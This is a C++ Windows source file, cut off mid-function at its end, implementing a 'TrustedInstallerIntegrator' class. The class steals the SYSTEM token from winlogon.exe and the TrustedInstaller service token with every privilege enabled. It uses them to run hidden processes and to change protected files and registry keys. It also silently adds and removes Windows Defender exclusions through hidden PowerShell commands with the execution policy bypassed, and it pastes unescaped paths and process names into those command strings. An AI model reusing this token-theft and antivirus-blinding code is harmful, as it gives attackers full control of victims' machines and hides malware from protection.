#include "TrustedInstallerIntegrator.h"
#include "common.h"
#include <tchar.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <objbase.h>
#include <iostream>
#include <algorithm>
#include <cctype>
#include <filesystem>
#include <string_view>
#include <span>

namespace fs = std::filesystem;

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

// ============================================================================
// CONSTANTS
// ============================================================================

static HANDLE g_cachedTrustedInstallerToken = nullptr;
static DWORD g_lastTokenAccessTime = 0;
static const DWORD TOKEN_CACHE_TIMEOUT = 30000;

// ============================================================================
// CONSTRUCTOR / DESTRUCTOR
// ============================================================================

TrustedInstallerIntegrator::TrustedInstallerIntegrator()
{
    CoInitialize(NULL);
}

TrustedInstallerIntegrator::~TrustedInstallerIntegrator()
{
    CoUninitialize();
    
    if (g_cachedTrustedInstallerToken) {
        CloseHandle(g_cachedTrustedInstallerToken);
        g_cachedTrustedInstallerToken = nullptr;
    }
}

// ============================================================================
// PRIVILEGE MANAGEMENT
// ============================================================================

std::wstring TrustedInstallerIntegrator::GetFullPrivilegeName(Privilege priv)
{
    size_t index = static_cast<size_t>(priv);
    if (index < PRIVILEGE_COUNT) {
        return L"Se" + std::wstring(PRIVILEGE_NAMES[index]) + L"Privilege";
    }
    return L"";
}

std::wstring TrustedInstallerIntegrator::GetFullPrivilegeName(std::wstring_view name)
{
    return L"Se" + std::wstring(name) + L"Privilege";
}

// ============================================================================
// CORE TOKEN MANAGEMENT
// ============================================================================

BOOL TrustedInstallerIntegrator::EnablePrivilegeInternal(std::wstring_view privilegeName)
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) 
        return FALSE;

    LUID luid;
    // .data() jest bezpieczne, bo string_view z literałów jest zazwyczaj null-terminated,
    // ale dla pewności w WinAPI lepiej używać c_str() jeśli dostępne lub upewnić się co do bufora.
    // Tutaj privilegeName pochodzi z format(), więc jest bezpieczne.
    if (!LookupPrivilegeValueW(NULL, privilegeName.data(), &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp{
        .PrivilegeCount = 1,
        .Privileges = {{.Luid = luid, .Attributes = SE_PRIVILEGE_ENABLED}}
    };

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);
    
    return result && (GetLastError() == ERROR_SUCCESS);
}

BOOL TrustedInstallerIntegrator::EnablePrivilege(Privilege priv)
{
    auto fullName = GetFullPrivilegeName(priv);
    if (fullName.empty()) return FALSE;
    return EnablePrivilegeInternal(fullName);
}

BOOL TrustedInstallerIntegrator::ImpersonateSystem()
{
    EnablePrivilege(Privilege::Debug);

    DWORD systemPid = GetProcessIdByName(L"winlogon.exe");
    if (systemPid == 0) return FALSE;

    HANDLE hSystemProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hSystemProcess) return FALSE;

    HANDLE hSystemToken;
    if (!OpenProcessToken(hSystemProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hSystemToken)) {
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDuplicatedToken)) {
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    BOOL result = ImpersonateLoggedOnUser(hDuplicatedToken);

    CloseHandle(hDuplicatedToken);
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);
    return result;
}

DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
{
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
    if (!hSCManager) return 0;

    SC_HANDLE hService = OpenServiceW(hSCManager, L"TrustedInstaller", 
                                      SERVICE_QUERY_STATUS | SERVICE_START);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return 0;
    }

    SERVICE_STATUS_PROCESS statusBuffer;
    DWORD bytesNeeded;
    
    if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusBuffer, 
                              sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return 0;
    }

    // Already running
    if (statusBuffer.dwCurrentState == SERVICE_RUNNING) {
        DWORD pid = statusBuffer.dwProcessId;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return pid;
    }

    // Start if stopped
    if (statusBuffer.dwCurrentState == SERVICE_STOPPED) {
        if (!StartServiceW(hService, 0, NULL)) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return 0;
        }
    }

    // Check immediately after start
    if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusBuffer,
                             sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
        if (statusBuffer.dwCurrentState == SERVICE_RUNNING) {
            DWORD pid = statusBuffer.dwProcessId;
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return pid;
        }
    }

    Sleep(100);
    
    DWORD pid = 0;
    if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusBuffer, 
                             sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
        if (statusBuffer.dwCurrentState == SERVICE_RUNNING) {
            pid = statusBuffer.dwProcessId;
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return pid;
}

HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken() 
{
    DWORD currentTime = GetTickCount();
    
    // Return cached token if valid
    if (g_cachedTrustedInstallerToken && (currentTime - g_lastTokenAccessTime) < TOKEN_CACHE_TIMEOUT) {
        return g_cachedTrustedInstallerToken;
    }
    
    // Clear expired token
    if (g_cachedTrustedInstallerToken) {
        CloseHandle(g_cachedTrustedInstallerToken);
        g_cachedTrustedInstallerToken = nullptr;
    }
    
    if (!EnablePrivilege(Privilege::Debug) || !EnablePrivilege(Privilege::Impersonate)) {
        ERROR(L"Failed to enable required privileges");
        return nullptr;
    }
    
    if (!ImpersonateSystem()) {
        ERROR(L"Failed to impersonate SYSTEM");
        return nullptr;
    }
    
    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (!trustedInstallerPid) {
        ERROR(L"Failed to start TrustedInstaller service");
        RevertToSelf();
        return nullptr;
    }
    
    HANDLE hTrustedInstallerProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, trustedInstallerPid);
    if (!hTrustedInstallerProcess) {
        ERROR(L"Failed to open TrustedInstaller process");
        RevertToSelf();
        return nullptr;
    }
    
    HANDLE hTrustedInstallerToken;
    if (!OpenProcessToken(hTrustedInstallerProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hTrustedInstallerToken)) {
        ERROR(L"Failed to open TrustedInstaller token");
        CloseHandle(hTrustedInstallerProcess);
        RevertToSelf();
        return nullptr;
    }
    
    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hTrustedInstallerToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, 
                         TokenImpersonation, &hDuplicatedToken)) {
        ERROR(L"Failed to duplicate TrustedInstaller token");
        CloseHandle(hTrustedInstallerToken);
        CloseHandle(hTrustedInstallerProcess);
        RevertToSelf();
        return nullptr;
    }
    
    CloseHandle(hTrustedInstallerToken);
    CloseHandle(hTrustedInstallerProcess);
    RevertToSelf();
    
    // Enable all privileges using modern C++23 approach
    // POPRAWKA DEEPSEEK: Iterujemy po enumach i rzutujemy na Privilege
    for (size_t i = 0; i < PRIVILEGE_COUNT; ++i) {
        // Używamy helpera, który sam złoży stringa
        auto fullName = GetFullPrivilegeName(static_cast<Privilege>(i));
        
        if (fullName.empty()) continue;

        LUID luid;
        if (LookupPrivilegeValueW(NULL, fullName.c_str(), &luid)) {
            TOKEN_PRIVILEGES tp{
                .PrivilegeCount = 1,
                .Privileges = {{.Luid = luid, .Attributes = SE_PRIVILEGE_ENABLED}}
            };
            AdjustTokenPrivileges(hDuplicatedToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
    }
    
    g_cachedTrustedInstallerToken = hDuplicatedToken;
    g_lastTokenAccessTime = currentTime;
    
    DEBUG(L"TrustedInstaller token cached successfully");
    return g_cachedTrustedInstallerToken;
}

// ============================================================================
// PROCESS EXECUTION
// ============================================================================

BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstaller(DWORD pid, std::wstring_view commandLine)
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) return FALSE;

    std::wstring mutableCmd{commandLine};

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    BOOL result = CreateProcessWithTokenW(hToken, 0, NULL, mutableCmd.data(), 0, NULL, NULL, &si, &pi);

    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return result;
}

BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstallerSilent(DWORD pid, std::wstring_view commandLine)
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) return FALSE;

    std::wstring mutableCmd{commandLine};

    STARTUPINFOW si{
        .cb = sizeof(si),
        .dwFlags = STARTF_USESHOWWINDOW,
        .wShowWindow = SW_HIDE
    };
    
    PROCESS_INFORMATION pi;
    BOOL result = CreateProcessWithTokenW(hToken, 0, NULL, mutableCmd.data(), CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (result) {
        DWORD waitResult = WaitForSingleObject(pi.hProcess, 3000);
        
        if (waitResult == WAIT_OBJECT_0) {
            DWORD exitCode;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            result = (exitCode == 0);
        } else {
            result = FALSE;
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return result;
}

bool TrustedInstallerIntegrator::RunAsTrustedInstaller(const std::wstring& commandLine)
{
    std::wstring finalCommandLine = commandLine;
    
    if (IsLnkFile(commandLine)) {
        finalCommandLine = ResolveLnk(commandLine);
        if (finalCommandLine.empty()) {
            return false;
        }
    }
    
    if (!ImpersonateSystem()) {
        return false;
    }

    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (trustedInstallerPid == 0) {
        RevertToSelf();
        return false;
    }

    BOOL result = CreateProcessAsTrustedInstaller(trustedInstallerPid, finalCommandLine);

    RevertToSelf();
    return result != FALSE;
}

bool TrustedInstallerIntegrator::RunAsTrustedInstallerSilent(const std::wstring& commandLine)
{
    std::wstring finalCommandLine = commandLine;
    
    if (IsLnkFile(commandLine)) {
        finalCommandLine = ResolveLnk(commandLine);
        if (finalCommandLine.empty()) {
            return false;
        }
    }
    
    if (!ImpersonateSystem()) {
        return false;
    }

    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (trustedInstallerPid == 0) {
        RevertToSelf();
        return false;
    }

    BOOL result = CreateProcessAsTrustedInstallerSilent(trustedInstallerPid, finalCommandLine);

    RevertToSelf();
    return result != FALSE;
}

// ============================================================================
// FILE OPERATIONS
// ============================================================================

bool TrustedInstallerIntegrator::WriteFileAsTrustedInstaller(std::wstring_view filePath, 
                                                             std::span<const BYTE> data) noexcept
{
    if (data.empty()) {
        ERROR(L"Cannot write empty data");
        return false;
    }

    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    std::wstring filePathStr{filePath};
    HANDLE hFile = CreateFileW(
        filePathStr.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        ERROR(L"Failed to create file: %s (error: %d)", filePathStr.c_str(), error);
        RevertToSelf();
        return false;
    }

    DWORD totalWritten = 0;
    const DWORD chunkSize = 64 * 1024;

    while (totalWritten < data.size()) {
        DWORD bytesToWrite = (std::min)(chunkSize, static_cast<DWORD>(data.size() - totalWritten));
        DWORD bytesWritten = 0;

        if (!::WriteFile(hFile, data.data() + totalWritten, bytesToWrite, &bytesWritten, NULL)) {
            ERROR(L"WriteFile failed at offset %d", totalWritten);
            CloseHandle(hFile);
            RevertToSelf();
            return false;
        }

        if (bytesWritten != bytesToWrite) {
            ERROR(L"Incomplete write: %d/%d bytes", bytesWritten, bytesToWrite);
            CloseHandle(hFile);
            RevertToSelf();
            return false;
        }

        totalWritten += bytesWritten;
    }

    CloseHandle(hFile);
    RevertToSelf();

    DEBUG(L"File written successfully: %s (%zu bytes)", filePathStr.c_str(), data.size());
    return true;
}

bool TrustedInstallerIntegrator::DeleteFileAsTrustedInstaller(std::wstring_view filePath) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    std::wstring filePathStr{filePath};
    
    DWORD attrs = GetFileAttributesW(filePathStr.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(filePathStr.c_str(), FILE_ATTRIBUTE_NORMAL);
    }

    BOOL result = DeleteFileW(filePathStr.c_str());
    DWORD error = result ? 0 : GetLastError();

    RevertToSelf();

    if (result) {
        DEBUG(L"File deleted: %s", filePathStr.c_str());
    } else {
        ERROR(L"Failed to delete file: %s (error: %d)", filePathStr.c_str(), error);
    }

    return result != FALSE;
}

bool TrustedInstallerIntegrator::CreateDirectoryAsTrustedInstaller(std::wstring_view directoryPath) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    std::wstring directoryPathStr{directoryPath};
    BOOL result = SHCreateDirectoryExW(NULL, directoryPathStr.c_str(), NULL);
    DWORD error = GetLastError();
    
    RevertToSelf();

    bool success = (result == ERROR_SUCCESS || error == ERROR_ALREADY_EXISTS);
    
    if (success) {
        DEBUG(L"Directory created with TrustedInstaller: %s", directoryPathStr.c_str());
    } else {
        ERROR(L"Failed to create directory: %s (error: %d)", directoryPathStr.c_str(), error);
    }

    return success;
}

bool TrustedInstallerIntegrator::RenameFileAsTrustedInstaller(std::wstring_view srcPath,
                                                              std::wstring_view dstPath) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    std::wstring srcPathStr{srcPath};
    std::wstring dstPathStr{dstPath};

    DWORD attrs = GetFileAttributesW(srcPathStr.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(srcPathStr.c_str(), FILE_ATTRIBUTE_NORMAL);
    }

    BOOL result = MoveFileW(srcPathStr.c_str(), dstPathStr.c_str());
    DWORD error = result ? ERROR_SUCCESS : GetLastError();

    RevertToSelf();

    if (!result) {
        ERROR(L"Failed to rename file: %s -> %s (error: %d)", srcPathStr.c_str(), dstPathStr.c_str(), error);
        return false;
    }

    DEBUG(L"File renamed successfully: %s -> %s", srcPathStr.c_str(), dstPathStr.c_str());
    return true;
}

// ============================================================================
// REGISTRY OPERATIONS
// ============================================================================

bool TrustedInstallerIntegrator::CreateRegistryKeyAsTrustedInstaller(HKEY hRootKey, 
                                                                     std::wstring_view subKey) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    HKEY hKey;
    DWORD dwDisposition;
    std::wstring subKeyStr{subKey};
    
    LONG result = RegCreateKeyExW(
        hRootKey,
        subKeyStr.c_str(),
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        SUCCESS(L"Registry key created: %s", subKeyStr.c_str());
    } else {
        ERROR(L"Failed to create registry key: %s (error: %d)", subKeyStr.c_str(), result);
    }

    RevertToSelf();
    return (result == ERROR_SUCCESS);
}

bool TrustedInstallerIntegrator::WriteRegistryValueAsTrustedInstaller(HKEY hRootKey,
                                                                      std::wstring_view subKey,
                                                                      std::wstring_view valueName,
                                                                      std::wstring_view value) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    std::wstring subKeyStr{subKey};
    HKEY hKey;
    LONG openResult = RegOpenKeyExW(hRootKey, subKeyStr.c_str(), 0, KEY_SET_VALUE, &hKey);
    
    if (openResult != ERROR_SUCCESS) {
        ERROR(L"Failed to open registry key: %s (error: %d)", subKeyStr.c_str(), openResult);
        RevertToSelf();
        return false;
    }

    std::wstring valueStr{value};
    LONG result = RegSetValueExW(
        hKey,
        std::wstring{valueName}.c_str(),
        0,
        REG_EXPAND_SZ,
        (const BYTE*)valueStr.c_str(),
        (DWORD)((valueStr.length() + 1) * sizeof(wchar_t))
    );

    RegCloseKey(hKey);
    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        SUCCESS(L"Registry value written: %s\\%s", subKeyStr.c_str(), std::wstring{valueName}.c_str());
    } else {
        ERROR(L"Failed to write registry value (error: %d)", result);
    }

    return (result == ERROR_SUCCESS);
}

bool TrustedInstallerIntegrator::WriteRegistryDwordAsTrustedInstaller(HKEY hRootKey,
                                                                      std::wstring_view subKey,
                                                                      std::wstring_view valueName,
                                                                      DWORD value) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    std::wstring subKeyStr{subKey};
    HKEY hKey;
    LONG openResult = RegOpenKeyExW(hRootKey, subKeyStr.c_str(), 0, KEY_SET_VALUE, &hKey);
    
    if (openResult != ERROR_SUCCESS) {
        ERROR(L"Failed to open registry key: %s (error: %d)", subKeyStr.c_str(), openResult);
        RevertToSelf();
        return false;
    }

    LONG result = RegSetValueExW(
        hKey,
        std::wstring{valueName}.c_str(),
        0,
        REG_DWORD,
        (const BYTE*)&value,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);
    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        SUCCESS(L"Registry DWORD written: %s\\%s = 0x%08X", subKeyStr.c_str(), std::wstring{valueName}.c_str(), value);
    } else {
        ERROR(L"Failed to write registry DWORD (error: %d)", result);
    }

    return (result == ERROR_SUCCESS);
}

bool TrustedInstallerIntegrator::WriteRegistryBinaryAsTrustedInstaller(HKEY hRootKey,
                                                                       std::wstring_view subKey,
                                                                       std::wstring_view valueName,
                                                                       std::span<const BYTE> data) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    std::wstring subKeyStr{subKey};
    HKEY hKey;
    LONG openResult = RegOpenKeyExW(hRootKey, subKeyStr.c_str(), 0, KEY_SET_VALUE, &hKey);
    
    if (openResult != ERROR_SUCCESS) {
        ERROR(L"Failed to open registry key: %s (error: %d)", subKeyStr.c_str(), openResult);
        RevertToSelf();
        return false;
    }

    LONG result = RegSetValueExW(
        hKey,
        std::wstring{valueName}.c_str(),
        0,
        REG_BINARY,
        data.data(),
        (DWORD)data.size()
    );

    RegCloseKey(hKey);
    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        SUCCESS(L"Registry binary written: %s\\%s (%zu bytes)", subKeyStr.c_str(), std::wstring{valueName}.c_str(), data.size());
    } else {
        ERROR(L"Failed to write registry binary (error: %d)", result);
    }

    return (result == ERROR_SUCCESS);
}

bool TrustedInstallerIntegrator::ReadRegistryValueAsTrustedInstaller(HKEY hRootKey,
                                                                     std::wstring_view subKey,
                                                                     std::wstring_view valueName,
                                                                     std::wstring& outValue) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    std::wstring subKeyStr{subKey};
    HKEY hKey;
    LONG openResult = RegOpenKeyExW(hRootKey, subKeyStr.c_str(), 0, KEY_QUERY_VALUE, &hKey);
    
    if (openResult != ERROR_SUCCESS) {
        ERROR(L"Failed to open registry key: %s (error: %d)", subKeyStr.c_str(), openResult);
        RevertToSelf();
        return false;
    }

    DWORD dataSize = 0;
    DWORD dataType = 0;
    LONG queryResult = RegQueryValueExW(hKey, std::wstring{valueName}.c_str(), NULL, &dataType, NULL, &dataSize);

    if (queryResult != ERROR_SUCCESS || (dataType != REG_SZ && dataType != REG_EXPAND_SZ)) {
        ERROR(L"Failed to query registry value size (error: %d, type: %d)", queryResult, dataType);
        RegCloseKey(hKey);
        RevertToSelf();
        return false;
    }

    std::vector<wchar_t> buffer(dataSize / sizeof(wchar_t) + 1);
    LONG result = RegQueryValueExW(
        hKey,
        std::wstring{valueName}.c_str(),
        NULL,
        &dataType,
        (LPBYTE)buffer.data(),
        &dataSize
    );

    RegCloseKey(hKey);
    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        outValue = std::wstring(buffer.data());
        SUCCESS(L"Registry value read: %s\\%s", subKeyStr.c_str(), std::wstring{valueName}.c_str());
        return true;
    } else {
        ERROR(L"Failed to read registry value (error: %d)", result);
        return false;
    }
}

bool TrustedInstallerIntegrator::DeleteRegistryKeyAsTrustedInstaller(HKEY hRootKey,
                                                                     std::wstring_view subKey) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    std::wstring subKeyStr{subKey};
    LONG result = RegDeleteTreeW(hRootKey, subKeyStr.c_str());

    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        SUCCESS(L"Registry key deleted: %s", subKeyStr.c_str());
    } else {
        ERROR(L"Failed to delete registry key: %s (error: %d)", subKeyStr.c_str(), result);
    }

    return (result == ERROR_SUCCESS);
}

// ============================================================================
// DEFENDER EXCLUSION MANAGEMENT
// ============================================================================

bool TrustedInstallerIntegrator::ValidateExtension(std::wstring_view extension) noexcept
{
    if (extension.empty()) return false;
    const std::wstring invalidChars = L"\\/:*?\"<>|";
    for (wchar_t c : extension) {
        if (invalidChars.find(c) != std::wstring::npos) return false;
    }
    return true;
}

bool TrustedInstallerIntegrator::ValidateIpAddress(std::wstring_view ipAddress) noexcept
{
    if (ipAddress.empty()) return false;

    std::string narrowIp;
    for (wchar_t c : ipAddress) {
        if (c > 127) return false;
        narrowIp += (char)c;
    }

    // Check for CIDR suffix
    std::string baseIp = narrowIp;
    size_t slashPos = narrowIp.find('/');
    if (slashPos != std::string::npos) {
        baseIp = narrowIp.substr(0, slashPos);
    }

    // IPv6 detection
    if (baseIp.find(':') != std::string::npos) {
        for (char c : baseIp) {
            if (!((c >= '0' && c <= '9') || 
                  (c >= 'a' && c <= 'f') || 
                  (c >= 'A' && c <= 'F') || 
                  c == ':' || c == '.')) {
                return false;
            }
        }
        return true;
    }

    // IPv4 validation
    int dots = 0;
    bool hasDigit = false;
    for (char c : baseIp) {
        if (c == '.') {
            dots++;
            if (!hasDigit) return false;
            hasDigit = false;
        } else if (c >= '0' && c <= '9') {
            hasDigit = true;
        } else {
            return false;
        }
    }

    return (dots == 3 && hasDigit);
}

std::wstring TrustedInstallerIntegrator::NormalizeExtension(std::wstring_view extension) noexcept
{
    std::wstring normalized{extension};
    std::transform(normalized.begin(), normalized.end(), normalized.begin(), ::towlower);
    
    if (!normalized.empty() && normalized[0] != L'.') {
        normalized = L"." + normalized;
    }
    
    return normalized;
}

std::wstring TrustedInstallerIntegrator::ExtractProcessName(std::wstring_view fullPath) noexcept
{
    size_t lastSlash = fullPath.find_last_of(L"\\/");
    if (lastSlash != std::wstring_view::npos) {
        return std::wstring{fullPath.substr(lastSlash + 1)};
    }
    return std::wstring{fullPath};
}

// ============================================================================
// DEFENDER AVAILABILITY CHECK
// ============================================================================

bool TrustedInstallerIntegrator::IsDefenderAvailable() noexcept
{
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return false;
    
    SC_HANDLE hService = OpenServiceW(hSCManager, L"WinDefend", SERVICE_QUERY_STATUS);
    bool defenderAvailable = (hService != NULL);
    
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    return defenderAvailable;
}

bool TrustedInstallerIntegrator::IsDefenderRunning() noexcept
{
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return false;
    
    SC_HANDLE hService = OpenServiceW(hSCManager, L"WinDefend", SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }
    
    SERVICE_STATUS_PROCESS status;
    DWORD bytesNeeded;
    BOOL success = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, 
                                       (LPBYTE)&status, sizeof(status), &bytesNeeded);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    return (success && status.dwCurrentState == SERVICE_RUNNING);
}

bool TrustedInstallerIntegrator::AddDefenderExclusion(ExclusionType type, std::wstring_view value)
{
    // Skip if Defender not available
    if (!IsDefenderAvailable()) {
        DEBUG(L"Windows Defender not available, skipping exclusion for: %s", std::wstring{value}.c_str());
        return true;
    }
    
    std::wstring processedValue{value};
    
    switch (type) {
        case ExclusionType::Extensions:
            if (!ValidateExtension(value)) {
                ERROR(L"Invalid extension format: %s", std::wstring{value}.c_str());
                return false;
            }
            processedValue = NormalizeExtension(value);
            break;
            
        case ExclusionType::IpAddresses:
            if (!ValidateIpAddress(value)) {
                ERROR(L"Invalid IP address format: %s", std::wstring{value}.c_str());
                return false;
            }
            break;
            
        case ExclusionType::Processes:
            processedValue = ExtractProcessName(value);
            break;
    }

    const wchar_t* prefNames[] = {
        L"ExclusionPath",
        L"ExclusionProcess",
        L"ExclusionExtension", 
        L"ExclusionIpAddress"
    };

    std::wstring command = L"powershell.exe -ExecutionPolicy Bypass -Command \"Add-MpPreference -";
    command += prefNames[(int)type];
    command += L" '";
    command += processedValue;
    command += L"'\"";

    INFO(L"Adding Defender exclusion: %s = %s", prefNames[(int)type], processedValue.c_str());
    
    bool result = RunAsTrustedInstallerSilent(command);
    
    if (result) {
        SUCCESS(L"Defender exclusion added successfully");
    } else {
        INFO(L"Failed to add Defender exclusion (Defender might be disabled)");
    }
    
    return result;
}

int TrustedInstallerIntegrator::AddMultipleDefenderExclusions(
    const std::vector<std::wstring>& paths,
    const std::vector<std::wstring>& processes,
    const std::vector<std::wstring>& extensions)
{
    if (!IsDefenderAvailable()) {
        INFO(L"Windows Defender not available, skipping exclusions");
        return 0;
    }

    INFO(L"Configuring Windows Defender exclusions...");
    
    int successCount = 0;
    int totalAttempts = 0;

    for (const auto& path : paths) {
        if (AddPathExclusion(path)) successCount++;
        totalAttempts++;
    }

    for (const auto& process : processes) {
        if (AddProcessExclusion(process)) successCount++;
        totalAttempts++;
    }

    for (const auto& extension : extensions) {
        if (AddExtensionExclusion(extension)) successCount++;
        totalAttempts++;
    }

    if (successCount > 0) {
        SUCCESS(L"Defender exclusions configured (%d/%d added)", successCount, totalAttempts);
    } else if (totalAttempts > 0) {
        INFO(L"No Defender exclusions were added (Defender might be disabled)");
    }

    return successCount;
}

// ============================================================================
// SIMPLIFIED DEFENDER EXCLUSION MANAGEMENT
// ============================================================================

bool TrustedInstallerIntegrator::RemoveDefenderExclusion(ExclusionType type, std::wstring_view value)
{
    std::wstring processedValue{value};
    
    switch (type) {
        case ExclusionType::Extensions:
            processedValue = NormalizeExtension(value);
            break;
        case ExclusionType::Processes:
            processedValue = ExtractProcessName(value);
            break;
    }

    const wchar_t* prefNames[] = {
        L"ExclusionPath",
        L"ExclusionProcess",
        L"ExclusionExtension",
        L"ExclusionIpAddress"
    };

    std::wstring command = L"powershell.exe -ExecutionPolicy Bypass -Command \"Remove-MpPreference -";
    command += prefNames[(int)type];
    command += L" '";
    command += processedValue;
    command += L"'\"";

    INFO(L"Removing Defender exclusion: %s = %s", prefNames[(int)type], processedValue.c_str());
    
    return RunAsTrustedInstallerSilent(command);
}

bool TrustedInstallerIntegrator::AddPathExclusion(std::wstring_view path) {
